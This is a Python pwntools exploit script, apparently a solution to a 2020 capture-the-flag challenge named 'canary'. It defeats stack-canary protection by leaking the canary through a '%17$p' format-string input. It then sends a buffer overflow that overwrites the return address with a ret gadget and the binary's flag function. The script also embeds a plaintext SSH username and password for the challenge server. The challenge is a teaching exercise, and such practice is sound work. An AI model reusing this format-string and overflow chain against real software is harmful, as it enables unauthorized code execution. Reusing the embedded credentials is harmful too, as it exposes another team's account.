from pwn import *
import sys

context.clear(arch='amd64', os='linux')

argv = sys.argv
binary_path = './canary'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	s = ssh(host='shell.actf.co', user='team5873', password='512d1e83099f560e01fe')
	sh = s.process([binary_path], cwd='/problems/2020/canary')
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* main
		''')

e = ELF(binary_path)

# ------------- plan -----------
# leak canary using format string
# buffer overflow using canary!
# jump to flag function

sh.sendlineafter("Hi! What's your name? ", '%17$p')
sh.recvuntil('Nice to meet you, ')
leaked_canary = int(sh.recvline()[:-2], 0)
log.info('canary: {}'.format(hex(leaked_canary)))

overflow_offset = 72
flag_address = e.sym['flag']
fake_rbp = 8 * 'B'
ret_gadget = 0x40060e

payload = 'A' * (overflow_offset - 16) + p64(leaked_canary) + fake_rbp + p64(ret_gadget) + p64(flag_address)

sh.sendlineafter('Anything else you want to tell me? ', payload)

print sh.recvall()



